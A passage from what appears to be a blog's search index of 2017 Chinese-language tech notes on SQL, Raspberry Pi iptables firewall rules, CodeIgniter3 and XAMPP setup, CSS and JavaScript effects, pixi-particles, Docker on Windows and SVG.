ORDER BY vc.sid DESC LIMIT 1 要改成 SELECT xxx,ooo FROM table1 ous LEFT JOIN table2 vc ON vc.user_id = 'dddddd' AND vc.type = 'ADD' AND vc.cancel IS NULL WHERE ous.uid = 'dddddd' OR ( ous.uid = 'dddddd' AND DATE_FORMAT(vc.end_date, '%Y-%m-%d') \u003e= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') \u003c DATE_FORMAT('2018-11-02' , '%Y-%m-%d')) ORDER BY vc.sid DESC LIMIT 1 ","date":"2017-07-13","objectID":"/blog/posts/logdown/2017-07-13-2043738/:0:0","tags":["sql"],"title":"SQL ON /WHERE差別","uri":"/blog/posts/logdown/2017-07-13-2043738/"},{"categories":["SQL"],"content":"今天找SQL 的IN ,EXISTS,=ANY差別找到這篇文章 十步完全理解 SQL 看了覺得該簡討一下 select a as named_column from a_form where named_column = 'c' 為什麼不能這樣用呢? 我之前聽到的是where抓不到這一層的 要再包一層才抓的到 select named_column (select a as named_column from a_form ) where named_column = 'c' 直到我看到2、 SQL 的语法并不按照语法顺序执行 覺得我最基礎關念沒搞清楚(差點要跪鍵盤了….) 這篇文章真的不錯，值得我記錄 不過文章禁止轉載 本文由 伯乐在线 - 水果泡腾片 翻译。未经许可，禁止转载！ 英文出处： Lukas Eder 。欢迎加入翻译组。 http://blog.jobbole.com/55086/ 在此記錄筆記 這篇看起來也不錯:P http://blog.jobbole.com/48369/ ","date":"2017-07-10","objectID":"/blog/posts/logdown/2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql/:0:0","tags":["sql"],"title":"SQL好文分享 - 十步完全理解 SQL","uri":"/blog/posts/logdown/2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql/"},{"categories":["Linux"],"content":"我的動物機設定，因為公司要報告 我使用reveal-md來報告 需要連回家裡電腦設定 因為之前沒有做記錄 就閱在做一下嘍:) 非中華電信網路封鎖 iptables -F //清除所有的已訂定的規則； iptables -P INPUT DROP //進來的封包全擋 iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT # 選項與參數： # -m ：一些 iptables 的外掛模組，主要常見的有： # state ：狀態模組 # mac ：網路卡硬體位址 (hardware address) # --state ：一些封包的狀態，主要有： # INVALID ：無效的封包，例如資料破損的封包狀態 # ESTABLISHED：已經連線成功的連線狀態； # NEW ：想要新建立連線的封包狀態； # RELATED ：這個最常用！表示這個封包是與我們主機發送出去的封包有關 iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT //內網192.168.1.0網域可以進來 iptables -A INPUT -i lo -j ACCEPT //localhost可以連 -i interface #iptables -A INPUT -p tcp –dport 80 -j ACCEPT //全部可以連 #taiwan ip input http:80 iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -","date":"2017-07-09","objectID":"/blog/posts/logdown/2017-07-09-raspberry-pi-set-firewall-iptables/:0:0","tags":["Raspberry Pi","iptables","Linux"],"title":"Raspberry PI 防火牆設定iptables","uri":"/blog/posts/logdown/2017-07-09-raspberry-pi-set-firewall-iptables/"},{"categories":["CSS"],"content":"http://div.io/topic/1278 https://codepen.io/malagege/pen/wexXwv?editors=0100 ","date":"2017-07-06","objectID":"/blog/posts/logdown/2017-07-06-2017945/:0:0","tags":["float","CSS"],"title":"float前面有元素會往下擠","uri":"/blog/posts/logdown/2017-07-06-2017945/"},{"categories":["CSS"],"content":"常常採到inline-block記一下筆記 http://www.cnblogs.com/starof/p/4512284.html ","date":"2017-07-04","objectID":"/blog/posts/logdown/2017-07-04-2000076/:0:0","tags":["CSS","vertical-align"],"title":"vertical-align對齊屬性筆記","uri":"/blog/posts/logdown/2017-07-04-2000076/"},{"categories":["CSS"],"content":"https://jsfiddle.net/nickday/fayzaew2/11/?utm_source=website\u0026utm_medium=embed\u0026utm_campaign=fayzaew2 ","date":"2017-07-02","objectID":"/blog/posts/logdown/2017-07-02-flex-meet-float/:0:0","tags":["flex","float"],"title":"flex遇到float","uri":"/blog/posts/logdown/2017-07-02-flex-meet-float/"},{"categories":["CodeIgniter3"],"content":"其實這篇寫的是Model… 但我覺得我寫的最多應該會是DB Driver Reference https://codeigniter.org.tw/userguide3/database/db_driver_reference.html?highlight=insert \u003c?php class news_m extends CI_Model { public function __construct() { parent::__construct(); } public function getData($id = '') { if ($id == ''): return $this-\u003edb-\u003eget('news');//SELECT * FROM news else: return $this-\u003edb-\u003ewhere('id', $id)-\u003eget('news'); endif; } public function insert($post) { $this-\u003edb-\u003einsert('news', $post); } public function update($post) { $this-\u003edb-\u003ewhere('id', $post['id'])-\u003eupdate('news', $post); } public function delete($id) { $this-\u003edb-\u003ewhere('id', $id)-\u003edelete('news'); } ","date":"2017-06-18","objectID":"/blog/posts/logdown/2017-06-18-1959922/:0:0","tags":["PHP","CodeIgniter3","Model"],"title":"CodeIgniter3 設定 Model","uri":"/blog/posts/logdown/2017-06-18-1959922/"},{"categories":["CodeIgniter3"],"content":"曾經看過一個文 他說php本身就是樣版引擎 不需要特別載入 之前有用過twig簡單的樣版引擎 CoeIgniter本身就是用php 當然也可以使用自己最愛用的 https://codeigniter.org.tw/userguide3/general/views.html 載入$this-\u003eload-\u003eview('name');在Controller特別簡單 沒有什麼難度XD #動態資料載入到 View $data = array( 'title' =\u003e 'My Title', 'heading' =\u003e 'My Heading', 'message' =\u003e 'My Message' ); $this-\u003eload-\u003eview('blogview', $data); //然後這裡是運用物件的方法傳入： $data = new Someclass(); $this-\u003eload-\u003eview('blogview', $data); 如果你是用物件，類別變數將會被轉成陣列元素。 \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c?=title?\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003e\u003c?=heading?\u003e\u003c/h1\u003e \u003c?=message?\u003e \u003c/body\u003e \u003c/html\u003e 跟Controller可以放在資料夾裡面 $this-\u003eload-\u003eview('directory_name/file_name'); 看到官方View比較特別的寫法https://codeigniter.org.tw/userguide3/general/alternative_php.html \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c?php echo $title;?\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003e\u003c?php echo $heading;?\u003e\u003c/h1\u003e \u003ch3\u003eMy Todo List\u003c/h3\u003e \u003cul\u003e \u003c?php foreach ($todo_list as $item):?\u003e \u003cli\u003e\u003c?php echo $item;?\u003e\u003c/li\u003e \u003c?php endforeach;?\u003e \u003c/ul\u003e \u003c/body\u003e \u003c/html\u003e 這段 foreach ($todo_list as $item):頭， endforeach;尾 老實說這樣寫View會比較好看，但可能要花一段時間習慣他 $string $this-\u003eload-\u003eview('myfile', '', TRUE); 就跟$string = var_dump($a, TRUE );和$string = print_r($a,TRUE )做一樣事情 CI3不知道為什麼，log_message不能放Object進去 不然會被卡入…. VIEW這篇還滿簡單的，有基處PHP看一下應該就會用了吧。 ","date":"2017-06-18","objectID":"/blog/posts/logdown/2017-06-18-1959863/:0:0","tags":["CodeIgniter3","PHP","View"],"title":"CodeIgniter3 設定 View","uri":"/blog/posts/logdown/2017-06-18-1959863/"},{"categories":["CodeIgniter3"],"content":"一直以為建立Controller一定要設定Router 我以為這是一定要的啦 但今天我看了官網文件 原來可以不用做XD https://codeigniter.org.tw/userguide3/general/controllers.html 檔案一定要被命名為 ‘Blog.php’，第一個字母必須大寫 ‘B’。 類別名稱必須以大寫字母開頭。 public function __construct() { parent::__construct(); // Your own constructor code } 這一句一定要貼到你的Controller裡面 我覺得比較有趣的是 Controller還可以放在資料夾裡面 例如controller/users/user.php網址可以輸入http://localhost/ci3/user/test2fff _remap好像照uri重新對印method _remap,output目前還不知道能運用在哪些地方 此篇筆記到這 `php ","date":"2017-06-18","objectID":"/blog/posts/logdown/2017-06-18-1959613/:0:0","tags":["PHP","CodeIgniter3","Controllers"],"title":"CodeIgniter3 設定 Controllers","uri":"/blog/posts/logdown/2017-06-18-1959613/"},{"categories":["CodeIgniter3"],"content":"routes.php可以設定CodeIgniter路由 這邊是設定所有路由 好像跟Rails設定方法有點不太一樣 不過也滿好懂的 $route['default_controller'] = 'welcome'; $route['404_override'] = ''; $route['translate_uri_dashes'] = FALSE; 預設導置Controller的Welcome.php那隻(PS:Contoller規定一開始要大寫) ‘welcome’ 後面method沒寫，就是導置welcome/index 當上面條件抓到，就會馬上導到Contoller 所以上下規則還算滿重要的 官網這篇寫的還滿清楚的 https://codeigniter.org.tw/userguide3/general/routing.html (:num) 將匹配只含有數字的一個片段。 (:any) 將匹配含有任何字元的一個片段（除了 ‘/’，這是區段界定符號）。 萬用字元實際上是正規表達式的別名， :any 被翻譯成 [^/]+ 以及 :num 被翻譯成 [0-9]+ 。 $route['login/(.+)'] = 'auth/login/$1'; $route['login/(:any)'] = 'auth/login/$1'; 簡單可以用正規化來定義路由設定 #路由中使用 HTTP 動詞 例如： $route[‘products’][‘put’] = ‘product/insert’; 上述例子，PUT 請求到 URI“products” 稱之為 Product::insert() 控制器方法。 $route[‘products/(:num)’][‘DELETE’] = ‘product/delete/$1’; DELETE 請求到 URL“products”第一個片段，數字在第二個片段將會重新映射到 Product::delete() 方法，傳入數值到第一個參數上。 使用 HTTP 動詞當然是可選的（非必要）。 還有此功能，有空來試試吧:P ","date":"2017-06-18","objectID":"/blog/posts/logdown/2017-06-18-1959505/:0:0","tags":["PHP","routes","CodeIgniter3"],"title":"CodeIgniter3 設定 Router","uri":"/blog/posts/logdown/2017-06-18-1959505/"},{"categories":["CodeIgniter"],"content":"最近有在學CodeIgniter3，想說再不敢快作筆記 會忘了特別快，雖然採用快速架站的XAMPP來架 但也有遇到一點點問題 在此做一下筆記 下載XAMPP解壓縮到你要裝的地方 再來setup_xampp.bat他會對XAMPP做設定 然後就可以啟用xampp-control.exe 再這之前 在把CodeIgniter3丟到htdocs目錄下 打開瀏覽器http://localhost/ci3(PS:我資料夾改成ci3) Welcome to CodeIgniter! The page you are looking at is being generated dynamically by CodeIgniter. If you would like to edit this page you'll find it located at: application/views/welcome_message.php The corresponding controller for this page is found at: application/controllers/Welcome.php If you are exploring CodeIgniter for the very first time, you should start by reading the User Guide. 看到這個畫面就成功了 接下來我們要去設定DB設定 首先去config.php把database啟用 $autoload['libraries'] = array('database'); 通常session也滿常用的，通常我也會順便啟用session $autoload['libraries'] = array('database','session'); 這個也滿常用的 $autoload['helper'] = array('url'); 接下來就是設定database.php 預設XAMPP沒有設定root帳號、密碼 但我這邊就不設定，正式還境通常要設定喔 $db['default'] = array( 'dsn' =\u003e '', 'hostname' =\u003e 'localhost', 'username' =\u003e '', 'password' =\u003e '', 'database' =\u003e 'test', 'dbdriver' =\u003e 'mysqli', 'dbprefix' =\u003e '', 'pconnect' =\u003e FALSE, 'db_debug' =\u003e (ENVIRONMENT !== 'production'), 'cache_on' =\u003e FALSE, 'cachedir' =\u003e '', 'char_set' =\u003e 'utf8', 'dbcollat' =\u003e 'utf8_general_ci', 'swap_pre' =\u003e '', 'encrypt' =\u003e FALSE, 'compress' =\u003e FALSE, 'stricton' =\u003e FALSE, 'failover' =\u003e array(), 'save_queries' =\u003e TRUE ); 再開瀏覽器http://locahost/ci3，顯示正常 這樣架設就算完成 有時你ci3不是載在第一層目錄 請記得照下面設定 RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ /(目錄path)/index.php/$1 [L] ","date":"2017-06-18","objectID":"/blog/posts/logdown/2017-06-18-in-xampp-for-window-codeigniter3/:0:0","tags":["CodeIgniter","PHP","XAMPP"],"title":"在Window用XAMPP架CodeIgniter3","uri":"/blog/posts/logdown/2017-06-18-in-xampp-for-window-codeigniter3/"},{"categories":["JavaScript"],"content":" function(e) { if (!e.ctrlKey \u0026\u0026 !e.shiftKey \u0026\u0026 !e.altKey) { $(\".site\").addClass(\"fade-out\"), $(\".mfp-close\").trigger(\"click\"); var t = $(this).attr(\"href\"); return setTimeout(function() { location.href = t }, 600), !1 } } 最近看到這段程式很好奇為什麼return 回去後面要加,變數 沒想到能這樣用 記錄一下 參考來源： https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Operators/Comma_Operator JS逗号运算符的用法详解(转) - pinocchioatbeijing - 博客园 http://www.cnblogs.com/pinocchioatbeijing/articles/2343736.html JavaScript 的逗號操作符 http://www.jstips.co/zh_tw/javascript/comma-operaton-in-js/ ","date":"2017-06-16","objectID":"/blog/posts/logdown/2017-06-16-1954776/:0:0","tags":["JavaScript"],"title":"JavaScript ,逗號運算符號","uri":"/blog/posts/logdown/2017-06-16-1954776/"},{"categories":["網頁特效"],"content":"最近還有個東西沒記錄 點連結動畫特效 覺得還不錯，就小小研究 照下面網站參照做個小小範例 http://nora-anime.net/ \u003cdiv class=\"header-menu\"\u003e1\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e2\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e3\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e4\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e5\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e6\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e7\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e8\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e9\u003c/div\u003e \u003cdiv class=\"header-menu\"\u003e10\u003c/div\u003e \u003cinput type=\"button\" id=\"btn\" value=\"toggle\" /\u003e @keyframes menu-in-s { 0% { opacity: 0; -webkit-transform: translateY(40px); transform: translateY(40px); -webkit-animation-timing-function: ease-out; animation-timing-function: ease-out } 80% { opacity: 1; -webkit-transform: translateY(-4px); transform: translateY(-4px) } 100% { -webkit-transform: translateY(0); transform: translateY(0) } } @keyframes menu-out-s { 0% { opacity: 1; -webkit-transform: translateY(0); transform: translateY(0); -webkit-animation-timing-function: cubic-bezier(.23, 1, .32, 1); animation-timing-function: cubic-bezier(.23, 1, .32, 1) } 100% { opacity: 0; -webkit-transform: translateY(40px); transform: translateY(40px); } } .header-menu:nth-of-type(1) { -webkit-animation: menu-in-s .4s linear 0s 1 normal both; animation: menu-in-s .4s linear 0s 1 normal both } .header-menu:nth-of-type(2) { -webkit-animation: menu-in-s .4s linear .05s 1 normal both; animation: menu-in-s .4s linear .05s 1 normal both } .header-menu:nth-of-type(3) { -webkit-animation: menu-in-s .4s linear .1s 1 normal both; animation: menu-in-s .4s linear .1s 1 normal both } .header-menu:nth-of-type(4) { -webkit-animation: menu-in-s .4s linear .15s 1 normal both; animation: menu-in-s .4s linear .15s 1 normal both } .header-menu:nth-of-type(5) { -webkit-animation: menu-in-s .4s linear .2s 1 normal both; animation: menu-in-s .4s linear .2s 1 normal both } .header-menu:nth-of-type(6) { -webkit-animation: menu-in-s .4s linear .25s 1 normal both; animation: menu-in-s .4s linear .25s 1 normal both } .header-menu:nth-of-type(7) { -webkit-animation: menu-in-s .4s linear .3s 1 normal both; animation: menu-in-s .4s linear .3s 1 normal both } .header-menu:nth-of-type(8) { -webkit-animation: menu-in-s .4s linear .35s 1 normal both; animation: menu-in-s .4s linear .35s 1 normal both } .header-menu:nth-of-type(9) { -webkit-animation: menu-in-s .4s linear .4s 1 normal both; animation: menu-in-s .4s linear .4s 1 normal both } .header-menu:nth-of-type(10) { -webkit-animation: menu-in-s .4s linear .45s 1 normal both; animation: menu-in-s .4s linear .45s 1 normal both } .header-menu-fadeout:nth-of-type(1) { -webkit-animation: menu-out-s .4s linear .36s 1 normal both; animation: menu-out-s .4s linear .36s 1 normal both } .header-menu-fadeout:nth-of-type(2) { -webkit-animation: menu-out-s .4s linear .32s 1 normal both; animation: menu-out-s .4s linear .32s 1 normal both } .header-menu-fadeout:nth-of-type(3) { -webkit-animation: menu-out-s .4s linear .28s 1 normal both; animation: menu-out-s .4s linear .28s 1 normal both } .header-menu-fadeout:nth-of-type(4) { -webkit-animation: menu-out-s .4s linear .24s 1 normal both; animation: menu-out-s .4s linear .24s 1 normal both } .header-menu-fadeout:nth-of-type(5) { -webkit-animation: menu-out-s .4s linear .2s 1 normal both; animation: menu-out-s .4s linear .2s 1 normal both } .header-menu-fadeout:nth-of-type(6) { -webkit-animation: menu-out-s .4s linear .16s 1 normal both; animation: menu-out-s .4s linear .16s 1 normal both } .header-menu-fadeout:nth-of-type(7) { -webkit-animation: menu-out-s .4s linear .12s 1 normal both; animation: menu-out-s .4s linear .12s 1 normal both } .header-menu-fadeout:nth-of-type(8) { -webkit-animation: menu-out-s .4s linear .08s 1 normal both; animation: menu-out-s .4s linear .08s 1 normal both } .header-menu-fadeout:nth-of-type(9) { -webkit-animation: menu-out-s .4s linear .04s 1 normal both; animation: menu-out-s .4s linear .04s 1 normal both } .header-menu-fadeout:nth-of-type(10) { -webkit-animation: menu-out-s .4s linear 0s 1 normal both; anim","date":"2017-06-13","objectID":"/blog/posts/logdown/2017-06-13-1948791/:0:0","tags":null,"title":"點超連結頁面動畫特效","uri":"/blog/posts/logdown/2017-06-13-1948791/"},{"categories":["pixi"],"content":" 上篇記錄了[CSS]看的到確摸不到的pointer-events屬性 裡面還有很炫的旋轉嶼毛特效 本來以為是計時器慢慢一秒做下去做旋轉 結果看code，竟然是pixijs特效做的 突破 D3.js 的速度極限 — 2D WebGL 與 PIXI.js Pixi.js 中文教學 簡單爬一下，PixiJS算是能幫你做出動畫用WebGL 加速 因此動畫會非常順暢(應該吧，我沒用過) 旋轉是透過下面的套件來實作的 pixijs/pixi-particles: A particle system for PixiJS 官網有一些範例 雨毛旋轉範例是用snow特效 官方雨毛旋轉特效 { \"alpha\": { \"start\": 1, \"end\": 0.5 }, \"scale\": { \"start\": 1, \"end\": 0.7, \"minimumScaleMultiplier\": 0.5 }, \"color\": { \"start\": \"#ffffff\", \"end\": \"#ffffff\" }, \"speed\": { \"start\": 100, \"end\": 75 }, \"acceleration\": { \"x\": 0, \"y\": 0 }, \"startRotation\": { \"min\": 80, \"max\": 100 }, \"rotationSpeed\": { \"min\": 10, \"max\": 40 }, \"lifetime\": { \"min\": 10, \"max\": 10 }, \"blendMode\": \"normal\", \"ease\": [ { \"s\": 0, \"cp\": 0.379, \"e\": 0.548 }, { \"s\": 0.548, \"cp\": 0.717, \"e\": 0.676 }, { \"s\": 0.676, \"cp\": 0.635, \"e\": 1 } ], \"frequency\": 0.5, \"emitterLifetime\": -1, \"maxParticles\": 140, \"pos\": { \"x\": 0, \"y\": 0 }, \"addAtBack\": false, \"spawnType\": \"rect\", \"spawnRect\": { \"x\": 0, \"y\": 0, \"w\": 900, \"h\": 100 } } 可把上方內容載入到PixiParticlesEditor 在把雨毛傳到上面，這樣就可以在PixiParticlesEditor看到特效 pixi-particles上面還有很多特效值的玩一玩 好像還能運用在RPG Maker上面 PixiParticlesEditor　pixi.js特效 - RPG Maker MV 讨论区 - 66RPG - Powered by Discuz! 參考來源： pixi.jsを勉強する[2] -PIXI Particles- - [ALL]| アクアリングBLOG PixiParticlesEditor ","date":"2017-06-04","objectID":"/blog/posts/logdown/2017-06-04-pixi-particles-feather-effect-analysis-notes/:0:0","tags":null,"title":"pixi-particles 羽毛特效分析筆記","uri":"/blog/posts/logdown/2017-06-04-pixi-particles-feather-effect-analysis-notes/"},{"categories":["CodeIgniter"],"content":"在config設定 $config['sess_save_path'] =BASEPATH.'../'.'session_file'; http://codeigniter.org.cn/forums/thread-21295-1-1.html 由於我是用Docker設定 目前猜測可能權限有問題… 導制錯誤 在此記錄，不然一下就忘記了XD ","date":"2017-06-02","objectID":"/blog/posts/logdown/2017-06-02-codeigniter-session-error-problems/:0:0","tags":null,"title":"CodeIgniter Session錯誤問題","uri":"/blog/posts/logdown/2017-06-02-codeigniter-session-error-problems/"},{"categories":["Docker"],"content":"上篇Docker裝的還滿順利的，但RUN https://github.com/bitnami/bitnami-docker-codeigniter 就發生了問題 ERROR: for s_myapp_1 Cannot create container for service myapp: invalid bind mo unt spec \"C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw\": invalid volume specification : 'C:\\Users\\computer\\Desktop\\s:/app:rw' ERROR: for myapp Cannot create container for service myapp: invalid bind mount spec \"C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw\": invalid volume specification: 'C :\\Users\\computer\\Desktop\\s:/app:rw' ERROR: Encountered errors while bringing up the project. 網路爬文有找到幾個方法，但都沒什麼用 http://qiita.com/ysti/items/aed9c766aed00fe731fc http://www.cnblogs.com/anliven/p/6481516.html https://xbug.lol/1341.html http://yanjunbiao.me/2016/01/03/Volume-Mount-Issue-of-Docker-on-Windows/ /c/Users/和’//C/Users/都還不行 後來發現奇怪，怎麼MariaDB怎麼會有Volumes設定 version: '2' services: mariadb: image: 'bitnami/mariadb:latest' labels: kompose.service.type: nodeport ports: - '3306:3306' volumes: - 'mariadb_data:/bitnami/mariadb' environment: # ALLOW_EMPTY_PASSWORD is recommended only for development. - ALLOW_EMPTY_PASSWORD=yes volumes: mariadb_data: driver: local 喔喔，原來可以加volumes version: '2' services: myapp: image: 'bitnami/codeigniter:latest' labels: kompose.service.type: nodeport ports: - '8000:8000' volumes: - 'myapp_data:/app' depends_on: - mariadb mariadb: image: 'bitnami/mariadb:latest' environment: - ALLOW_EMPTY_PASSWORD=yes volumes: myapp_data: driver: local 就正常了 想說這樣應該能很順利，但…馬上就遇到Network問題 Docker port沒法轉到實體IP上面 我記得在VM跑ubuntu docker沒有這個問題 該不會又是Windows …. 想說這個能解決 https://blog.ephrain.net/virtualbox-%E4%BD%BF%E7%94%A8-port-forwarding-%E9%80%A3%E4%B8%8A-nat-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84-vm/ 遺憾還是不能…. 怎麼在win10 上安裝docker desktop ~ 迪貝之家 ","date":"2017-06-02","objectID":"/blog/posts/logdown/2017-06-02-win7-installation-docker-part-two/:0:0","tags":["Volumes"],"title":"在Win7安裝Docker(下) - Window Volumes問題","uri":"/blog/posts/logdown/2017-06-02-win7-installation-docker-part-two/"},{"categories":["Docker"],"content":"由於最近想跑一此程式，想玩Docker 可是工司遠端環境有用VMWare，這個又不能跟Docker 相容 想說用一台筆電用boot2docker玩玩看好了 Deprecated This project (the boot2docker Windows Installer) is officially deprecated in favor of the new Docker Toolbox. 經過爬文 Docker Toolbox 能在Windows 7上跑 原理是用Virtualbox跑VM 就來安裝看看，結果桌面的Docker Quickstart Terminal打不開害我緊張一下。 Kitematic 還滿OK順利可以執行。 步驟有看到這下面這個網站寫的很清楚了 https://sites.google.com/a/fuanps.tp.edu.tw/d4s/4-jian-zhi/kitematic-alpha-for-windows 想說一切都很順利，但沒想到裝 https://github.com/bitnami/bitnami-docker-codeigniter 發生幾個問題….留下篇寫 ","date":"2017-06-01","objectID":"/blog/posts/logdown/2017-06-01-win7-installation-docker/:0:0","tags":null,"title":"在Win7安裝Docker(上)","uri":"/blog/posts/logdown/2017-06-01-win7-installation-docker/"},{"categories":["實用工具"],"content":"今天在Facebook看保哥直播 介紹好用的JSON Server，要如何做好快速建立JSON Resful測試環境 簡單做一下筆記 npm install -g json-server json-server -w db.json 就可以完成一個簡單Web Server 但是這個並非安全的，預設有CORS 並非只有存JSON查詢，有 新增/修改/刪除 功能 最後他還介紹了，這還有router功能… 這真是強大的測試工具。 ","date":"2017-05-30","objectID":"/blog/posts/logdown/2017-05-30-1898666/:0:0","tags":["JSON-Server"],"title":"好用的前端測試工具JSON-Server","uri":"/blog/posts/logdown/2017-05-30-1898666/"},{"categories":["HTML"],"content":"最近覺得前端計術還滿重要的 趁著動畫課程還沒開始 把一些基本功學一學 主要參考這篇教學 [SVG 完整教學 31 天 ](http://www.oxxostudio.tw/articles/201410/svg-tutorial.html 目前看到Day4 SVG Path 基礎篇 在這篇簡單記錄看Day1~Day4筆記 Day2 SVG Layer介紹，一般在向量軟體都是最上層圖層在上面 但換在Code裡面，SVG最下面才是最上層 SVG 研究之路 (3) - 基本形狀 矩形 rect 圓角矩形 rect rx ry 圓形circle cx cy r 橢圓ellipse cx cy rx ry 多邊形polygon points SVG 研究之路 (4) - Path 基礎篇 這篇感覺就還滿難的，貝茲曲線不知道麼畫 看懂在寫… M = moveto L = lineto H = horizontal lineto V = vertical lineto C = curveto S = smooth curveto Q = quadratic Bézier curve T = smooth quadratic Bézier curveto A = elliptical Arc Z = closepath 參考來源： SVG https://www.w3schools.com/graphics/svg_path.asp SVG 超硬派了解 line, polygon, polyline, path (手工繪製) https://wcc723.github.io/d3js/2014/10/02/Ironman-30-days-03/ 四個 SVG 動畫應用範例 － Firefox 十週年活動網站技術解密 http://tech.mozilla.com.tw/posts/5660/%E5%9B%9B%E5%80%8B-svg-%E5%8B%95%E7%95%AB%E6%87%89%E7%94%A8%E7%AF%84%E4%BE%8B-%EF%BC%8D-firefox-%E5%8D%81%E9%80%B1%E5%B9%B4%E6%B4%BB%E5%8B%95%E7%B6%B2%E7%AB%99%E6%8A%80%E8%A1%93%E8%A7%A3%E5%AF%86 cubic-bezier http://cubic-bezier.com/ 練習畫向量圖 http://bezier.method.ac/ ","date":"2017-05-29","objectID":"/blog/posts/logdown/2017-05-29-svg-notes/:0:0","tags":["SVG"],"title":"SVG筆記紀錄(一)","uri":"/blog/posts/logdown/2017-05-29-svg-notes/"},{"categories":["CSS"],"content":"其實這篇是網站特效筆記 但還是分開兩個，方便以後參考 http://www.tenshi-no-3p.com/網站看到下圖特效，往下飄的羽毛竟然放在前面 怎麼不會擋住下面的連結 經過仔細的探討 原來CSS有pointer-events好用的屬性 